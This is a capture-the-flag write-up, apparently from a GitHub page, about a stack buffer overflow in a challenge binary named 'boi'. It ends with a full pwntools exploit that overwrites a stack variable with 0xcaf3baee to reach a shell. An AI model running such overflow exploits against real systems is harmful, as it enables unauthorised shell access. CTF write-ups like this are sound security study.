![image](https://github.com/AndreQuimper/Writeups/assets/96965806/692e6dd9-3a52-4b11-b6cc-d55728af969a)  

If we run the binary we get the following:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/8d720445-0758-4bb2-bada-bb37fec5d32f)  
Looks like we wont get much more information without looking at the disassembly.  

This is what main looks like:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c4e5d4e6-048f-482b-9d5f-134cf7bd1208)  
And this is what the stack layout looks like:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c2a3e143-0a33-4978-bada-2e4a98ba5030)  

Basically we can see that there is a stack region at `stack-0x24` that is set to `0xdeadbeef` and then compared to `0xcaf3baee` to determine if we print a date or run a shell.  
Since we can write 0x18 bytes into stack-0x38, we can determine an offset of 0x14 bytes and writing into the memory the desired value.  

Final Exploit:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template boi
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'boi')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
br *main+103
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendline(b"A"*0x14 + p64(0xcaf3baee))

io.interactive()
```





